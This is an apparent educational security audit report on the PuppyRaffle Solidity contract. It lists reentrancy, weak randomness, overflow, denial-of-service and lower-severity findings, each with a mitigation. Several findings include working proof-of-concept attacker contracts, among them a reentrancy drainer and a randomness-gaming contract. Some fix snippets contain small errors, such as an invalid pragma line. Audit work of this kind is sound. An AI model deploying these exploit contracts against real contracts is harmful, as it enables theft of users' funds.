# High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows an attacker can drain contract with a malicious receive or fallback function

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balances.

In the `PuppyRaffle::refund` function, an external call to the `msg.sender` address is made, only after making that external call is the `PupyRaffle::players` array updated

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

A player who entered the raffle could have a `fallback`/`receive` function that calls `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:** 

1. Users enters the raffle
2. Attackers sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attackers enters the raflle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>

Add the following to the `PuppyRaffleTest.t.sol` test file

```javascript
    function test_reentrancyInRefund() public {
        // Victim players enter raffle
        uint256 playersNum = 20;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);

        // Attacker setup and launch reentrancy attack
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingRaffleContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Attacker Contract Balance before attack: ", startingAttackContractBalance);
        console.log("PuppyRaffle Contract Balance before attack: ", startingRaffleContractBalance);

        console.log("Attacker Contract Balance after attack: ", address(attackerContract).balance);
        console.log("PuppyRaffle Contract Balance after attack: ", address(puppyRaffle).balance);

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attackerContract).balance, (entranceFee * playersNum) + entranceFee);
    }
```

And this contract as well

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>

**Recommended Mitigation:** To prevent this, we should have tthe `PuupyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy NFT 

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

*Notes:* This additionally means users could front-run this function and call `refund` if they see that they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the lottery. Hence, winner is no longer choosen at pure randomness. 

Also because the same method is used to generate the puppy rarity, they could also manipulate the number and mint the `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffle.

**Proof of Concept:**

1. Validators ahead of time can know the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [solidity blog on prevrandao]{https://soliditydeveloper.com/prevrandao}. `block.difficulty` is now `block.prevrandao`
2. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.
3. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!

<details>
<summary>Proof of Code</summary>

Add the following to the `PuppyRaffleTest.t.sol` test file

```javascript
function test_RandomnessCanBeGamed() public {
        // 5 real players first enter raffle
        uint256 playersNum = 5;
        address[] memory playersToAdd = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersToAdd[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersToAdd);

        vm.warp(block.timestamp + 1 days + 1);

        // Deploy Attack Contract
        RandomnessAttack attackerContract = new RandomnessAttack(address(puppyRaffle));

        // Attack, manipulate randomness
        attackerContract.attackRandomness{value: 4 ether}(); // value needed may vary

        // Assert
        uint256 attackbalanceAfter = address(attackerContract).balance;
        console.log("attackerBalanceAfter: ", attackbalanceAfter);
        assertEq(address(puppyRaffle.getPreviousWinner()), address(attackerContract));
    }
```

```javascript
contract RandomnessAttack {
    PuppyRaffle raffle;

    constructor(address puppy) {
        raffle = PuppyRaffle(puppy);
    }

    function attackRandomness() public payable {
        uint256 playersLength = raffle.getPlayersLength();

        uint256 winnerIndex;
        uint256 toAdd = playersLength; // starts at real player length - assuming it 5 with last player at index 4
        // Basically this loop tries to figure out how many players in total must be in the players array for winnerIndex to fall into the Attack contracts index
        while (true) {
            winnerIndex =
                uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % toAdd;
            if (winnerIndex == playersLength) break; // stop looping if it lands on Attacker's index - 5
            ++toAdd;
        }
        uint256 toLoop = toAdd - playersLength; // Total Players needed - Current total players

        // Set up playersToAdd with Attacker address occupying 0th
        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);
        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;
        // Enter raffle with Attacker at 5th index in players array
        raffle.enterRaffle{value: valueToSend}(playersToAdd);
        raffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        public
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }
}
```
</details>

Using on-chain values as a randomness seed is a [well-documented attack vector]{https://medium.com/better-programming/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf} in the block chain space.

**Recommended Mitigation:** Consider using a cryptographically proveable random number generator such as [Chainlink VRF]{https://docs.chain.link/vrf}.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```javascript
uint64 myVar = type(uint64).max; // 18.446744073709551615
myVar = myVar + 1; // myVar will now be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variables overflows, the `feeAddresses` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// aka
totalFees = 800000000000000000 + 1780000000000000000
// and this will overflow
totalFees = 1553255926290448384
```
4. you will not be able to withdraw due to the strict ETH equality check in `PuppyRaffle::withdrawFees`:
```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not the intended design of the protocol. At some point there will be too much balance in the contract that the above will be impossible to hit.

<details>
<summary>Code</summary>

```javascript
    function test_totalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800,000,000,000,000,000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("starting total fees: ", startingTotalFees);
        console.log("ending total fees: ", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

**Recommended Mitigation:** There are a few possible mitigations.

1. Use a newer version of solidity, and a `uint256` instead of `uint64` for `PuppyRaffle::totalFees`
2. You could also use the `SafeMath` library of OpenZeppelin for version of 0.7.6 of solidity, however you would still have a hard time with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`
```diff
-    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final require, so we recommend removing it regardlessy.

### [H-4] Malicious winner can forever halt the raffle
<!-- TODO: This is not accurate, but there are some issues. This is likely a low. Users who don't have a fallback can't get their money and the TX will fail. -->

**Description:** Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.

```javascript
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.

There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.

Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.

**Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

**Proof of Concept:** 

<details>
<summary>Proof Of Code</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function testSelectWinnerDoS() public {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    address[] memory players = new address[](4);
    players[0] = address(new AttackerContract());
    players[1] = address(new AttackerContract());
    players[2] = address(new AttackerContract());
    players[3] = address(new AttackerContract());
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.expectRevert();
    puppyRaffle.selectWinner();
}
```

For example, the `AttackerContract` can be this:

```javascript
contract AttackerContract {
    // Implements a `receive` function that always reverts
    receive() external payable {
        revert();
    }
}
```

Or this:

```javascript
contract AttackerContract {
    // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.
    receive() external payable {}
}
```
</details>

**Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.

### [H-5] Potential Loss of Funds During Prize Pool Distribution

**Description:** In `PuppyRaffle::refund` function, a player's address is set to `address(0)` in the `players` array. Therefore when the `PuppyRaffle::selectWinner` is called and the random index generated happens to be that of the player who refunded, all the prize will be sent to `address(0)`.
```javascript
players[playerIndex] = address(0);
```
Also there is a mis-calculation in the `PuppyRaffle::selectWinner` function, because a player has been refunded, so the contract now has lesser ETH balance. But this calculation still assumes that the players length is the same and tries to send more than the `PuppyRaffle` contract has to winner.
```javascript
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100; 
```

**Impact:** 

1. All the prize pool money will be lost to `address(0)`
2. If luckily winner is not `address(0)` transaction will revert with `outOfFunds`

**Proof of Concept:**

1. Player `Bob` enters lottery and his index is set to `5th` index
2. `Bob` calls `PupyRaffle::refund` to leave the raffle
3. `5th` is now set to `address(0)`
4. `PuppyRaffle:selectWinner` is called and random index happens to be `5th` index
5. Prize pool is sent to `address(0)` lossing everything.

**Recommended Mitigation:** 

1. Delete the player index that has refunded.
```diff
-   players[playerIndex] = address(0);

+    players[playerIndex] = players[players.length - 1];
+    players.pop()
```
NOTE: This will change the position of the last element

2. Implement additional checks in the `selectWinner` function to ensure that prize money is not sent to address(0)

# Medium

### [M-1] Looping through the unbounded players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for subsequent players who enter much later after raffle started will be dramatically higher than that of those who entered at the early stage of the raffle. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
// @audit DoS attack
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas cost will be as such:
- 1st 100 players: ~6503225
- 2nd 100 players: ~18995465

This mor than 3x more expensive for the second 100 player.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_denialOfService() public {
            // Let's enter 100 players first
            uint256 playersNum = 100;
            address[] memory players = new address[](playersNum);
            for (uint256 i = 0; i < playersNum; i++) {
                players[i] = address(uint160(i));
            }
            // See how much gas it costs
            uint256 gasStart = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
            uint256 gasEnd = gasleft();
            uint256 gasUsedFirst = (gasStart - gasEnd);
            console.log("Gas cost of the first 100 players: ", gasUsedFirst);

            // Now for the second 100 players
            address[] memory playersTwo = new address[](playersNum);
            for (uint256 i = 0; i < playersNum; i++) {
                playersTwo[i] = address(uint160(i + playersNum)); // instead of 0, 1, 2, -> 100, 101 ,102
            }
            // See how much gas it costs
            uint256 gasStartSecond = gasleft();
            puppyRaffle.enterRaffle{value: (entranceFee * players.length)}(playersTwo);
            uint256 gasEndSecond = gasleft();
            uint256 gasUsedSecond = (gasStartSecond - gasEndSecond);
            console.log("Gas cost of the second 100 players: ", gasUsedSecond);

            assert(gasUsedFirst < gasUsedSecond);
        }
```
</details>

**Recommended Mitigation:** There are a few recommendations. 

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

```diff
    // This will increment everytime a winner is chosen
    // Start from 1 since default value for uint256 in the usersToRaffleId is always 0
+   uint256 public raffleId = 1;
+   mapping(address => uint256) public usersToRaffleId;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
+           // Check for duplicates only from the new players            
+           require(usersToRaffleId[newPlayers[i]] == raffleId, "PuppyRaffle: Duplicate player");
            players.push(newPlayers[i]);
+            usersToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
    .
    .
    .
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

**Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check. 

```javascript
    function withdrawFees() external {
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

**Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees. 

**Proof of Concept:**

1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
2. Malicious user sends 1 wei via a `selfdestruct`
3. `feeAddress` is no longer able to withdraw funds

**Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function. 

```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated. 

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value. 

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:** 

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```
But the potential gas saved isn't worth it if we have to recast and this bug exists. 

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart contract wallets raffle winners without a `receive` or `fallback` function will block the start a new contest

**Description:** The `PuppyRaffle::selectWiner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-walllet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could reevert many times, making a lottery reset difficult.

Also, true winners would not get paid out and someone else could take their money!

**Proof of Concept:**

1. 10 smart contract wallets without a fallback or receive a function enters the lottery.
2. The lottery ends
3. Since all players rejects payment, The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrant (not recommended)
2. Create a mapping of addresses -> payout amount so winners can pull their funds out themselves with a new `claimPrize` function, putting the owners on the winner to claim their prize. (Recommended)

> Pull over Push Concept: Instead of pushing or forcing them payments, allow users to pull it themselves.

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, which may lead a player at index 0 to incorrectly think they are not already in the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at the first index, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
@>      return 0;
    }
```

**Impact:**  A player at index 0 may incorrectly think that they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle:players` updates index 0 to the user
3. `PuppyRaffle::getActivePlayerIndex` and it returns 0
4. User thinks they have not entered correctly due to the function's documentation. 

**Recommended Mitigation:** The easiest recommendation would be to recert if the player is not in the array instead of returniing 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

# Informational

### [I-1] Unspecific Solidity Pragma

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results. 

**Recommended Mitigation:** Lock up pragma versions

```diff
- pragma solidity ^0.8.0;
+ pragma solidity +0.8.0;
```

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>

### [I-2] Outdated Solidity Versio

**Description:**
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither]{https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity} documentaton for more information

### [I-3] Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 67](src/PuppyRaffle.sol#L67)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 214](src/PuppyRaffle.sol#L214)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### [I-4] `PupyRaffle:selectWinner` does not follow CEI, which is not a best practice

Following CEI (Checks, Effects, Interactions) helps mitigate attacks like reentrancy.

```diff
-      (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+      (bool success,) = winner.call{value: prizePool}("");
+      require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

Examples:
```javascript
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
```

instead, you could use:

```javascript
    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PRECISION = 100;
```

### [I-6] State changes are mssing events

### [I-7] `PuppyRaffle::_isActivePlayer` is never used and should be removed

## Gas

### [G-1] Unchanged state variablles should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::raraImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loops should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient. 

```diff
+       uint256 playersLength = players.lenth;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playersLength - 1; i++){
-               for (uint256 j = i + 1; j < players.length; j++) {
+               for (uint256 j = i + 1; j < playersLength; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }
```